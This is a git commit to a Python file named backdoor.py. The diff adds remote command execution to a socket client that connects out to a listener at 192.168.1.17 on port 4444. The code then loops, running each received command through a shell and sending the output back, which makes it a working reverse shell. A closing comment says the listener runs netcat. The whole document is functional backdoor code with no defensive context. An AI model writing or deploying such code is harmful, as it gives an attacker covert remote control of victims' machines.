d49e33224f1f0d5d1c088d7d7fd334264be5374a
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-04 05:26:27 -0400

    execute cmd remotely

--- backdoor.py
+++ backdoor.py
@@ -1,16 +1,21 @@
 #!/usr/bin/env python
 import socket
+import subprocess
+
+def execute(cmd):
+    return subprocess.check_output(cmd, shell=True)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("192.168.1.17", 4444))
 
 s.send(b"\n[+] Connection Successful!!!\n")
-recved_data = s.recv(1024)
-try:
-    print(recved_data.decode("utf-8"))
-except:
-    print(recved_data)
-
+while True:
+    cmd = s.recv(1024)
+    try:
+        result = execute(cmd.decode("utf-8"))
+    except:
+        result = execute(str(cmd))
+    s.send(result)
 s.close()
 '''
 In 192.168.1.17 we listen for incoming connections using netcat
